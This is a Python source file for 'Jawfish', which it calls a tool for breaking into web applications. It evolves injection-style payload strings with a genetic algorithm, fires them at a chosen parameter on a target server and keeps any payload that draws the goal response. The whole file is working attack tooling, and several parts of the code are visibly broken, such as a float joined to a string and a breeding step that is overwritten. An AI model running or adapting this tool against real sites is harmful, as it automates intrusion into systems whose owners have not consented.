#!/usr/bin/env python

'''
Jawfish is a tool designed to break into web applications.

Built on top of Soen Vanned's Forced Evolution.
https://github.com/soen-vanned/forced-evolution

Loaded into the web app (jawfish.io) via Brython.

Version 1.0
'''

from sys import argv
from queue import PriorityQueue
import time
import random
import base64
import zlib
import urllib
import requests
from browser import document, html, window

def result_out(text_to_result_box):
    document['result_box'] <= html.P(text_to_result_box)

def skip_line():
    document['result_box'] <= html.P('\n')

result_out('Jawfish v1.0 running')
result_out('********************')

def usage():
    result_out('Usage:')
    result_out('  python jf.py <options>')
    result_out('  Options:')
    result_out('    TARGET=<target IP / hostname>')
    result_out('    ADDR=<directory>')
    result_out('    VULN_VAR=<vulnerable variable>')
    result_out('    METHOD=<post/get>')
    result_out('    OTHER_VARIABLES=[other vars for post/get]')
    result_out('      VAR1=DATA1&VAR2=DATA2')
    result_out('    GOAL_TEXT=<server response of success>')
    skip_line()
    result_out('All are required but OTHER_VARIABLES')

start_time = time.time()
result_out('Start time = ' + start_time)
OTHER_VARIABLES = {}
GOAL_TEXT = 'KEY_DATA'
tools = """~!@#$%^&*()_+{}|:"<>?,./;'[]\=-0987654321`qwertyuioplkjhgfdsa""" +\
    """zxcvbnmQWERTYUIOPLKJHGFDSAZXCVBNM"""
tools += """$%*";'`""" * 3  # use this to influence creature evolution
TARGET = ''
ADDR = ''
CREATURE_COUNT = 333  # this number will become multiplied by 3 due to the
GENOME_LENGTH = 32    # breeding with the database that will take place
CULL_RATE = 0.67
MUTATION_RATE = .80
TIMEOUT = .01
VULN_VAR = ''
GENE_POOL_INFLUENCE = 1  # pool will increase to (pool_original +
MAX_MUTATIONS = 1         # loaded_genomes * GENE_POOL_INFLUENCE)
REQ_TOTAL = 0
BASE_RESPONSE = ''
METHOD = 'get'  # default is get, but post is allowed as well

###DBSTARTMARKER###
DB = ''
###DBENDMARKER###

def process_targeting_form():
    global BASE_RESPONSE, REQ_TOTAL, METHOD, GOAL_TEXT, TARGET, ADDR,\
        OTHER_VARIABLES, VULN_VAR
    url_string = window.location.href
    url_string = urllib.unquote( url_string )
    try:
        TARGET = ((url_string.split('?TARGET='))[1].split('&ADDR')[0])
        result_out('[+]\tTarget %s acquired!' % TARGET)
        ADDR = ((url_string.split('&ADDR='))[1].split('&VULN_VAR')[0])
        if ADDR[0] == '/':
            ADDR = ADDR[1:]
        result_out('[+]\tPath %s acquired!' % ADDR)
        VULN_VAR = ((url_string.split('&VULN_VAR='))[1].split('&METHOD')[0])
        result_out('[+]\tPotentially vulnerable variable %s registered!' % VULN_VAR)
        METHOD = (((((url_string.split('&METHOD='))[1].split('&GOAL_TEXT')[0]) == 'post') and 1) or 0)
        result_out('[+]\tUsing method [%s] for GREAT success' % ((METHOD and 'post') or 'get'))
        OTHER_VARIABLES = {}
        GOAL_TEXT = url_string.split('&GOAL_TEXT=')[1]
        result_out('[+]\tAttempting to gain a base heuristic...')
        OTHER_VARIABLES[VULN_VAR] = 'AAAA'
        BASE_RESPONSE = requests.get(
            'http://%s/%s' % (TARGET, ADDR),
            params=OTHER_VARIABLES,
            timeout=3
        ).text
        if (BASE_RESPONSE.lower().find('not found') != -1 or
                BASE_RESPONSE.lower().find('404') != -1):
            result_out('404 or \'not found\' discovered on page....are you sure this is OK?')
            result_out('\npage text:\n\n')
            result_out(BASE_RESPONSE)
            skip_line()
            result_out('lets try it anyway, you crazy cat')
        return True
    except:
        result_out('targeting argument FAIL\n\n')
        return False

class Creature:
    genome = ''
    is_alive = False
    score = 100
    m_text = {}

    def __init__(self, args, tools):
        self.genome = ''
        self.modified = 1
        self.is_alive = True
        if args == 0:
            self.genome = tools
        else:
            tmp = args
            result_out('creating genome with '+ str(tmp) + 'chars')
            for i in range(random.randint(tmp / 2, tmp)):
                self.genome += tools[random.randrange(0, len(tools))]
        return None

    def run_simulation(self):
        global TARGET, ADDR, VULN_VAR, TIMEOUT, REQ_TOTAL,\
            METHOD, OTHER_VARIABLES
        tmp = OTHER_VARIABLES
        tmp[VULN_VAR] = self.genome
        try:
            if METHOD == 0:
                r = requests.get('http://%s/%s' % (TARGET, ADDR),
                                 params=tmp, timeout=TIMEOUT)
            else:
                r = requests.post('http://%s/%s' % (TARGET, ADDR),
                                  data=tmp, timeout=TIMEOUT)
            REQ_TOTAL += 1
            self.m_text['text'] = r.text
            self.m_text['url'] = r.url
            self.m_text['status_code'] = r.status_code
        except:
            pass
        return self.m_text

def create_creatures(num, genome_length, tools):
    c = []
    for i in range(0, num):
        c.append(Creature(genome_length, tools))
    return c

def cull_it(c):
    global CULL_RATE
    c_temp = PriorityQueue()
    qsize = c.qsize()
    l = int(qsize - qsize * CULL_RATE)
    result_out('[i]\tPopulation size %d, cull rate %s, living specimens: %d' % (c.qsize(), str(CULL_RATE), l))
    result_out('[.]\tBeginning the cull of underperforming creatures...')
    for i in range(l):
        flag = 0
        while flag == 0:
            tmp = c.get()
            if tmp[1].genome != '':
                c_temp.put(tmp)
                flag = 1
    result_out('[+]\tCull done!')
    return c_temp

def mutate(s):
    global tools, MUTATION_RATE
    num_mutations = 0
    for i in range(0, MAX_MUTATIONS):
        if random.random() < MUTATION_RATE:
            num_mutations += 1
    M_CHAR = 0.80
    A_CHAR = 0.60
    R_CHAR = 0.05
    for i in range(0, num_mutations):
        decision = random.random()
        m = tools[random.randint(0, len(tools)-1)]
        if decision > M_CHAR:
            # modify a character inline (20%)
            si = random.randint(0, len(s))
            s = s[0:si] + m + s[si+1:]
        elif decision < M_CHAR and decision > A_CHAR:
            # append a character (20%)
            s += m
        elif decision < M_CHAR and decision < A_CHAR and decision > R_CHAR:
            # prepend a character (50%)
            s = m + s
        elif decision < R_CHAR:
            # delete a character (10%)
            si = random.randint(0, len(s))
            s = s[0:si] + s[si+1:]
    return s

def breed_it(ca):
    c_temp = PriorityQueue()
    result_out('[.]\tBreeding Next Generation...')
    while len(ca) > 0:
        if len(ca) == 1:
            cq = ca.pop(0)
            c_temp.put((cq.score, cq))
            return c_temp
        a = ca.pop(0)
        a1 = a.genome[0:len(a.genome) / 2]
        a2 = a.genome[len(a.genome):]
        # pull a random partner to mate with
        # it's a free society, after all
        b = ca.pop(random.randint(0, len(ca) - 1))
        b1 = b.genome[0:len(b.genome)]
        b2 = b.genome[len(b.genome):]
        c = Creature(0, a1 + b2)
        d = Creature(0, b1 + a2)
        e = Creature(0, mutate(a1 + b2))
        f = Creature(0, mutate(b1 + a2))
        a.modified = 0
        b.modified = 0
        c.modified = 1
        d.modified = 1
        e.modified = 1
        f.modified = 1
        c_temp.put((0, a))
        c_temp.put((0, b))
        c_temp.put((0, c))
        c_temp.put((0, d))
        c_temp.put((0, e))
        c_temp.put((0, f))
    result_out('[.]\tSuccess')
    return c_temp

def fitnessfunction(creature_to_score):
    global GOAL_TEXT
    if creature_to_score.modified == 0:
      return 0
    s = creature_to_score.run_simulation()
    creature_to_score.score = 100
    if s == {}:
        creature_to_score.score = 100
        return
    if ((creature_to_score.genome.find('cat') != -1) and
            (creature_to_score.genome.find('key') != -1)):
        result_out('this bastard should work....')
        result_out(creature_to_score.genome)
        result_out(s['text'])
        result_out(s['url'])
    if (s['text'].lower().find(GOAL_TEXT.lower()) != -1):
        creature_to_score.score -= 100
        result_out('[+]\tExploit Found')
        result_out(creature_to_score.genome)
        result_out('------------------------------------------')
        save_DB(creature_to_score.genome)
        return 1
    elif (str(s['status_code']) == '500'):
        creature_to_score.score -= 20
    elif s['text'].find(creature_to_score.genome) != -1:
        creature_to_score.score -= 10
    else:
        creature_to_score.score = 100
    if creature_to_score.score == 9999999999999999999:
        #thisAlgorithmBecomingSkynetCost
        exit()
    return 0

def main():
    global CREATURE_COUNT
    if process_targeting_form():
        c0 = []
        c1 = PriorityQueue()
        result_out('[+]\tLoading DB...')
        #load in creatures from DB
        lc = load_DB()
        loaded_creatures = lc.split('\n')
        #finish loading
        result_out('[+]\tSuccess')
        result_out('[+]\tCreating initial batch of creatures...')
        cl = create_creatures(CREATURE_COUNT, GENOME_LENGTH, tools)
        generation = 0
        for i in cl:
            c1.put((100, i))
        for i in loaded_creatures:
            c1.put((50, Creature(0, i)))
            for ii in range(0, GENE_POOL_INFLUENCE-1):
                c1.put((50, Creature(0, mutate(i))))
        result_out('[+]\tSuccess')
        result_out('[+]\tPre-breeding in loaded creatures with the population for great success')
        while not c1.empty():
            c = c1.get()[1]
            c0.append(c)
        c1 = breed_it(c0)
        c1 = c0
        result_out('[+]\tSuccess')
        exploit_found = 0
        while exploit_found == 0:
            generation += 1
            CREATURE_COUNT = c1.qsize()
            result_out('[>]\tRunning with creature_count %d,\tgeneration %d' % (CREATURE_COUNT, generation))
            c2 = PriorityQueue(0)
            cached_c = 0
            total_c = 0
            while not c1.empty():
                c = c1.get()[1]
                total_c += 1
                if c.modified == 0:
                    cached_c += 1
                if fitnessfunction(c) == 1:
                    exploit_found = 1
                    break
                c2.put((c.score, c))
            result_out('[i]\tEfficiency %s, cached[%d], total[%d]' % (str((total_c-cached_c) * 1.0 / total_c),cached_c,total_c))
            c3 = cull_it(c2)
            c4 = []
            while not c3.empty():
                c = c3.get()[1]
                c4.append(c)
            c1 = breed_it(c4)
        result_out('[i]\tExploit found in %d seconds with %d requests' % (abs(int(start_time - time.time())), REQ_TOTAL))

def load_DB():
    if DB != '':
        return zlib.decompress(base64.b64decode(DB))
    else:
        result_out('[!]\tInternal database not found, attempting to load external...')
        lc = ''
        f = open('database', 'a')
        f.close()
        f = open('database')
        lc = f.read().replace('\r\n', '\n')
        f.close()
        return lc

def save_DB(exploit_found):
    f = open(argv[0], 'r+')
    tmp = f.read()
    f.seek(0)
    db_start = tmp.find('###DBSTARTMARKER###') +\
        len('###DBSTARTMARKER###') + 1
    db_end = tmp.find('###DBENDMARKER###')
    DB = base64.b64encode(zlib.compress(load_DB() + '\n' + exploit_found))
    tmp = tmp[0:db_start] + 'DB = \'' + DB + '\'\n' + tmp[db_end:]
    f.write(tmp)
    f.close()

if __name__ == '__main__':
    main()
